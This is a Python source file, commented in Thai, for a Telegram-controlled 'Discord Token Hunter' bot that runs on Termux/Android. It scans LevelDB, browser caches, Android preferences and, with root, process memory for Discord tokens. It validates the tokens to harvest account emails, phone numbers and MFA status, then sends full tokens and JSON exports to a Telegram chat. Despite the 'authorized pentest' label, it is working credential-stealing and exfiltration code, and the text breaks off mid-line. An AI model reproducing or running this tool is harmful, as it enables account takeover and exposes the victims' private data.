#!/usr/bin/env python3
"""
Telegram Bot for Discord Token Extraction
Works on Termux (Android) - Authorized Pentest Tool
"""

import os
import sys
import json
import time
import logging
import asyncio
import threading
from datetime import datetime
from typing import Optional

# Import our modules
from config import *
from token_extractor import TokenExtractor, TokenManager, TokenValidator

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("DiscordTokenBot")

# Global token manager
token_manager = TokenManager()
scan_in_progress = False


class TelegramBot:
    """Telegram Bot handler using polling"""
    
    def __init__(self, token: str):
        self.token = token
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
        self.allowed_users = ALLOWED_USERS
        
    def _api_request(self, method: str, data: dict = None) -> dict:
        """Make Telegram API request"""
        url = f"{self.base_url}/{method}"
        try:
            r = requests.post(url, json=data or {}, timeout=15)
            return r.json()
        except Exception as e:
            logger.error(f"Telegram API error: {e}")
            return {"ok": False, "error": str(e)}
    
    def is_authorized(self, user_id: int) -> bool:
        """Check if user is authorized"""
        if not self.allowed_users:
            return True
        return user_id in self.allowed_users
    
    def send_message(self, chat_id: int, text: str, parse_mode: str = "HTML",
                    disable_web_page_preview: bool = True) -> Optional[int]:
        """Send message to Telegram"""
        result = self._api_request("sendMessage", {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview,
        })
        
        if result.get("ok"):
            return result["result"]["message_id"]
        return None
    
    def send_photo(self, chat_id: int, photo_url: str, caption: str = ""):
        """Send photo to Telegram"""
        self._api_request("sendPhoto", {
            "chat_id": chat_id,
            "photo": photo_url,
            "caption": caption,
        })
    
    def send_document(self, chat_id: int, file_path: str, caption: str = ""):
        """Send file to Telegram"""
        url = f"{self.base_url}/sendDocument"
        try:
            with open(file_path, 'rb') as f:
                r = requests.post(url, data={
                    "chat_id": chat_id,
                    "caption": caption,
                }, files={"document": f})
                return r.json()
        except Exception as e:
            logger.error(f"Send document error: {e}")
    
    def edit_message(self, chat_id: int, message_id: int, text: str):
        """Edit existing message"""
        self._api_request("editMessageText", {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": "HTML",
        })
    
    def get_updates(self) -> list:
        """Get new updates from Telegram"""
        result = self._api_request("getUpdates", {
            "offset": self.offset,
            "timeout": 30,
            "allowed_updates": ["message", "callback_query"],
        })
        
        if result.get("ok"):
            updates = result["result"]
            if updates:
                self.offset = updates[-1]["update_id"] + 1
            return updates
        return []
    
    def handle_command(self, chat_id: int, user_id: int, command: str, args: str = ""):
        """Handle incoming commands"""
        
        if not self.is_authorized(user_id):
            self.send_message(chat_id, "⛔ คุณไม่มีสิทธิ์ใช้งานบอทนี้")
            return
        
        commands = {
            "/start": self.cmd_start,
            "/help": self.cmd_help,
            "/scan": self.cmd_scan,
            "/fullscan": self.cmd_fullscan,
            "/status": self.cmd_status,
            "/tokens": self.cmd_tokens,
            "/validate": self.cmd_validate,
            "/info": self.cmd_info,
            "/export": self.cmd_export,
            "/clear": self.cmd_clear,
        }
        
        handler = commands.get(command)
        if handler:
            handler(chat_id, user_id, args)
        else:
            self.send_message(chat_id, f"❌ ไม่รู้จักคำสั่ง {command}\nใช้ /help เพื่อดูคำสั่งที่มี")
    
    # ======== COMMAND HANDLERS ========
    
    def cmd_start(self, chat_id: int, user_id: int, args: str):
        """Handle /start command"""
        text = (
            "🤖 <b>Discord Token Hunter Bot</b>\n\n"
            "บอทสำหรับค้นหา Discord Token บน Termux\n"
            "ใช้ในการทดสอบความปลอดภัยที่ได้รับอนุญาตเท่านั้น\n\n"
            "📌 <b>คำสั่งที่มี:</b>\n"
            "  /scan - Scan หา token (ทั่วไป)\n"
            "  /fullscan - Scan ทุกอย่าง (ต้อง root)\n"
            "  /status - เช็คสถานะ\n"
            "  /tokens - ดู token ที่เจอ\n"
            "  /validate - ตรวจสอบ token ทั้งหมด\n"
            "  /info [token] - ดูข้อมูล token\n"
            "  /export - ส่งออกไฟล์ JSON\n"
            "  /clear - ล้าง token ทั้งหมด\n"
            "  /help - วิธีใช้\n\n"
            f"📊 Token ที่เจอ: {token_manager.get_summary()['total']} tokens\n"
            f"✅ ใช้ได้: {token_manager.get_summary()['valid']}"
        )
        self.send_message(chat_id, text)
    
    def cmd_help(self, chat_id: int, user_id: int, args: str):
        """Handle /help command"""
        text = (
            "📚 <b>วิธีใช้ Discord Token Hunter</b>\n\n"
            "🔍 <b>การ Scan:</b>\n"
            "  /scan - สแกน LevelDB + Cache + Database\n"
            "  /fullscan - สแกนทุกอย่างรวม Memory (ต้อง root)\n\n"
            "📊 <b>การจัดการ:</b>\n"
            "  /tokens - ดูรายการ token ทั้งหมด\n"
            "  /validate - ตรวจสอบว่า token ไหนใช้ได้บ้าง\n"
            "  /info [token] - ดูข้อมูลละเอียดของ token\n"
            "  /export - ดาวน์โหลดผลลัพธ์เป็น JSON\n"
            "  /clear - ล้างข้อมูล token ทั้งหมด\n\n"
            "ℹ️ <b>ข้อมูล:</b>\n"
            "  /status - เช็คสถานะระบบและสิทธิ์\n\n"
            "⚠️ <b>ข้อควรระวัง:</b>\n"
            "  • ใช้เพื่อการทดสอบที่ได้รับอนุญาตเท่านั้น\n"
            "  • Root access ช่วยให้ค้นหาได้ลึกขึ้น\n"
            "  • Token ที่เจอจะถูกบันทึกในเครื่องเท่านั้น\n"
            f"\n📱 Termux: {'✅ ใช่' if 'com.termux' in os.environ.get('PREFIX', '') else '❌ ไม่ใช่'}\n"
            f"🔐 Root: {'✅ มี' if os.geteuid() == 0 else '❌ ไม่มี'}"
        )
        self.send_message(chat_id, text)
    
    def cmd_scan(self, chat_id: int, user_id: int, args: str):
        """Handle /scan command - basic scan"""
        global scan_in_progress
        
        if scan_in_progress:
            self.send_message(chat_id, "⏳ กำลัง scan อยู่ กรุณารอ...")
            return
        
        scan_in_progress = True
        msg_id = self.send_message(chat_id, "🔍 เริ่มสแกนหา Discord token...\n⏳ กรุณารอสักครู่")
        
        try:
            config = {
                "SCAN_LEVELDB": True,
                "SCAN_MEMORY": False,  # No root
                "SCAN_BROWSERS": True,
                "SCAN_ANDROID_PREFS": False,
                "MAX_TOKENS_PER_SCAN": 30,
            }
            
            extractor = TokenExtractor()
            found_tokens = extractor.scan_all(config)
            
            if found_tokens:
                token_manager.add_tokens(found_tokens)
                summary = token_manager.get_summary()
                
                text = (
                    f"✅ <b>สแกนเสร็จสิ้น!</b>\n\n"
                    f"🔑 พบ token ทั้งหมด: {len(found_tokens)} tokens\n"
                    f"📦 Token รวมทั้งหมด: {summary['total']} tokens\n\n"
                    f"📊 <b>ที่มา:</b>\n"
                )
                
                # Group by source
                sources = {}
                for token, (source, detail) in found_tokens.items():
                    if source not in sources:
                        sources[source] = 0
                    sources[source] += 1
                
                for source, count in sorted(sources.items(), key=lambda x: -x[1]):
                    text += f"  • {source}: {count} tokens\n"
                
                text += f"\n💡 ใช้ /validate เพื่อตรวจสอบ token"
                self.edit_message(chat_id, msg_id, text)
            else:
                self.edit_message(chat_id, msg_id, "❌ ไม่พบ Discord token ในระบบ")
        
        except Exception as e:
            logger.error(f"Scan error: {e}")
            self.edit_message(chat_id, msg_id, f"❌ เกิดข้อผิดพลาด: {str(e)}")
        
        finally:
            scan_in_progress = False
    
    def cmd_fullscan(self, chat_id: int, user_id: int, args: str):
        """Handle /fullscan command - deep scan with memory"""
        global scan_in_progress
        
        if os.geteuid() != 0:
            self.send_message(chat_id, "⛔ ต้องใช้ root เพื่อทำ fullscan\nใช้ /scan แทน")
            return
        
        if scan_in_progress:
            self.send_message(chat_id, "⏳ กำลัง scan อยู่ กรุณารอ...")
            return
        
        scan_in_progress = True
        msg_id = self.send_message(chat_id, "🔍 เริ่ม Full Scan...\n⚠️ อาจใช้เวลาหลายนาที")
        
        try:
            config = {
                "SCAN_LEVELDB": True,
                "SCAN_MEMORY": True,
                "SCAN_BROWSERS": True,
                "SCAN_ANDROID_PREFS": True,
                "MAX_TOKENS_PER_SCAN": 50,
            }
            
            extractor = TokenExtractor()
            found_tokens = extractor.scan_all(config)
            
            if found_tokens:
                token_manager.add_tokens(found_tokens)
                summary = token_manager.get_summary()
                
                text = (
                    f"✅ <b>Full Scan เสร็จสิ้น!</b>\n\n"
                    f"🔑 พบ token ทั้งหมด: {len(found_tokens)} tokens\n"
                    f"📦 รวมทั้งหมด: {summary['total']} tokens\n\n"
                    f"📊 <b>ที่มา:</b>\n"
                )
                
                sources = {}
                for token, (source, detail) in found_tokens.items():
                    if source not in sources:
                        sources[source] = 0
                    sources[source] += 1
                
                for source, count in sorted(sources.items(), key=lambda x: -x[1]):
                    text += f"  • {source}: {count} tokens\n"
                
                if any("Memory" in s for s in sources):
                    text += "\n🧠 พบ token ในหน่วยความจำ!"
                
                text += f"\n💡 ใช้ /validate เพื่อตรวจสอบ token"
                self.edit_message(chat_id, msg_id, text)
            else:
                self.edit_message(chat_id, msg_id, "❌ ไม่พบ Discord token ในระบบ")
        
        except Exception as e:
            logger.error(f"Full scan error: {e}")
            self.edit_message(chat_id, msg_id, f"❌ เกิดข้อผิดพลาด: {str(e)}")
        
        finally:
            scan_in_progress = False
    
    def cmd_status(self, chat_id: int, user_id: int, args: str):
        """Handle /status command"""
        summary = token_manager.get_summary()
        
        text = (
            "📊 <b>สถานะระบบ</b>\n\n"
            f"🤖 Bot: ✅ ทำงานปกติ\n"
            f"📱 Termux: {'✅ ใช่' if 'com.termux' in os.environ.get('PREFIX', '') else '❌ ไม่ใช่'}\n"
            f"🔐 Root: {'✅ มี' if os.geteuid() == 0 else '❌ ไม่มี'}\n"
            f"🕐 เวลา: {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"📦 <b>คลัง Token:</b>\n"
            f"  • ทั้งหมด: {summary['total']}\n"
            f"  • ตรวจสอบแล้ว: {summary['validated']}\n"
            f"  • ✅ ใช้ได้: {summary['valid']}\n"
            f"  • ❌ ใช้ไม่ได้: {summary['invalid']}"
        )
        
        self.send_message(chat_id, text)
    
    def cmd_tokens(self, chat_id: int, user_id: int, args: str):
        """Handle /tokens command - list all found tokens"""
        summary = token_manager.get_summary()
        
        if summary['total'] == 0:
            self.send_message(chat_id, "📭 ยังไม่มี token ในระบบ\nใช้ /scan เพื่อค้นหา")
            return
        
        token_list = token_manager.get_token_list(max_tokens=20)
        
        text = (
            f"🔑 <b>รายการ Token (แสดง {len(token_list)} รายการ)</b>\n\n"
        )
        
        for i, t in enumerate(token_list, 1):
            status = "✅" if t.get("valid") else ("⬜" if t.get("valid") is None else "❌")
            username = t.get("username", "?")
            disc = t.get("discriminator", "????")
            
            text += (
                f"{i}. {status} <code>{t['token_preview']}</code>\n"
                f"   📁 {t['source']} | {t['detail']}\n"
            )
            
            if t.get("username"):
                text += f"   👤 {username}#{disc}\n"
            
            text += "\n"
        
        text += (
            f"📊 รวม: {summary['total']} tokens | "
            f"✅ {summary['valid']} ใช้ได้\n"
            f"💡 ใช้ /validate เพื่อตรวจสอบ หรือ /info [token_id]"
        )
        
        self.send_message(chat_id, text)
    
    def cmd_validate(self, chat_id: int, user_id: int, args: str):
        """Handle /validate command - validate all tokens"""
        summary = token_manager.get_summary()
        
        if summary['total'] == 0:
            self.send_message(chat_id, "📭 ไม่มี token ให้ตรวจสอบ\nใช้ /scan ก่อน")
            return
        
        msg_id = self.send_message(chat_id, "🔄 กำลังตรวจสอบ token...\n⏳ กรุณารอสักครู่")
        
        valid_tokens = token_manager.validate_all(token_limit=20)
        
        if valid_tokens:
            text = (
                f"✅ <b>ตรวจสอบเสร็จสิ้น!</b>\n\n"
                f"🔑 พบ token ที่ใช้ได้: {len(valid_tokens)} tokens\n\n"
            )
            
            for t in valid_tokens[:10]:  # Show max 10
                nitro = "💎" if t.get("nitro") else ""
                mfa = "🔒" if t.get("mfa") else "🔓"
                text += (
                    f"• {nitro} {t.get('username', '?')}#{t.get('discriminator', '????')} {mfa}\n"
                    f"  📧 {t.get('email', 'Hidden')}\n"
                    f"  📁 {t['source']} | 🆔 {t.get('user_id', '?')}\n\n"
                )
            
            text += f"💡 ใช้ /export เพื่อดาวน์โหลดผลลัพท์"
            self.edit_message(chat_id, msg_id, text)
        else:
            self.edit_message(chat_id, msg_id, "❌ ไม่พบ token ที่ใช้ได้")
    
    def cmd_info(self, chat_id: int, user_id: int, args: str):
        """Handle /info command - detailed token info"""
        if not args:
            self.send_message(chat_id, "⚠️ ใช้: /info [token_id หรือ token]\nเช่น: /info 1")
            return
        
        # Check if it's a number (index)
        if args.isdigit():
            idx = int(args) - 1
            token_list = list(token_manager.tokens.values())
            if idx < 0 or idx >= len(token_list):
                self.send_message(chat_id, f"❌ ไม่มี token ที่ {args}")
                return
            token = token_list[idx]["token"]
        else:
            token = args
        
        # Validate this specific token
        result = TokenValidator.test_token(token)
        
        if result.get("valid"):
            text = (
                f"✅ <b>Token ใช้ได้!</b>\n\n"
                f"👤 {result.get('username', '?')}#{result.get('discriminator', '????')}\n"
                f"🆔 ID: {result.get('user_id', '?')}\n"
                f"📧 Email: {result.get('email', 'Hidden')}\n"
                f"📱 Phone: {result.get('phone', 'None')}\n"
                f"🔐 MFA: {'✅ เปิด' if result.get('mfa') else '❌ ปิด'}\n"
                f"💎 Nitro: {'✅ มี' if result.get('nitro') else '❌ ไม่มี'}\n"
                f"✅ Verified: {'ใช่' if result.get('verified') else 'ไม่'}\n"
                f"📝 Bio: {result.get('bio', '(ไม่มี)')[:100]}\n\n"
                f"🔑 Token:\n<code>{token}</code>"
            )
        else:
            text = (
                f"❌ <b>Token ไม่สามารถใช้ได้</b>\n\n"
                f"เหตุผล: {result.get('error', 'Unknown')}\n\n"
                f"🔑 Token:\n<code>{token[:50]}...</code>"
            )
        
        self.send_message(chat_id, text)
    
    def cmd_export(self, chat_id: int, user_id: int, args: str):
        """Handle /export command - export results to JSON"""
        summary = token_manager.get_summary()
        
        if summary['total'] == 0:
            self.send_message(chat_id, "📭 ไม่มีข้อมูลให้ส่งออก\nใช้ /scan ก่อน")
            return
        
        # Create output directory
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        
        # Export to JSON
        filename = f"discord_tokens_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(OUTPUT_DIR, filename)
        token_manager.export_to_json(filepath)
        
        msg_id = self.send_message(chat_id, "📤 กำลังส่งไฟล์...")
        
        caption = (
            f"📦 Discord Token Report\n"
            f"📊 {summary['total']} tokens | {summary['valid']} ใช้ได้\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        self.send_document(chat_id, filepath, caption)
        self.edit_message(chat_id, msg_id, "✅ ส่งไฟล์เรียบร้อย!")
    
    def cmd_clear(self, chat_id: int, user_id: int, args: str):
        """Handle /clear command - clear all tokens"""
        token_manager.clear_tokens()
        self.send_message(chat_id, "🗑️ ล้างข้อมูล token ทั้งหมดเรียบร้อย")
    
    def run(self):
        """Main bot loop"""
        logger.info("Bot started!")
        
        while True:
            try:
                updates = self.get_updates()
                
                for update in updates:
                    if "message" not in update:
                        continue
                    
                    message = update["message"]
                    chat_id = message["chat"]["id"]
                    user_id = message["from"]["id"]
                    username = message["from"].get("username", "Unknown")
                    text = message.get("text", "")
                    
                    # Log activity
                    logger.info(f"Command from @{username}: {text[:50]}")
                    
                    # Parse command
                    if text.startswith("/"):
                        parts = text.split(maxsplit=1)
                        command = parts[0].lower()
                        args = parts[1] if len(parts) > 1 else ""
                        
                        self.handle_command(chat_id, user_id, command, args)
                
                time.sleep(0.5)
                
            except KeyboardInterrupt:
                logger.info("Bot stopped by user")
                break
            except Exception as e:
                logger.error(f"Bot error: {e}")
                time.sleep(5)


def main():
    """Main entry point"""
    
    # Check bot token
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ กรุณาใส่ TELEGRAM_BOT_TOKEN ใน config.py")
        print("   ไปที่ @BotFather บน Telegram เพื่อสร้างบอท")
        sys.exit(1)
    
    # Check if on Termux
    if 'com.termux' in os.environ.get('PREFIX', ''):
        print("📱 Discord Token Hunter Bot")
        print("=" * 40)
        print(f"🔐 Root: {'✅ มี' if os.geteuid() == 0 else '❌ ไม่มี'}")
        print(f"📁 Output: {OUTPUT_DIR}/")
        print()
        print("🚀 กำลังเริ่มบอท...")
        print("=" * 40)
    
    # Create output directory
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    # Run b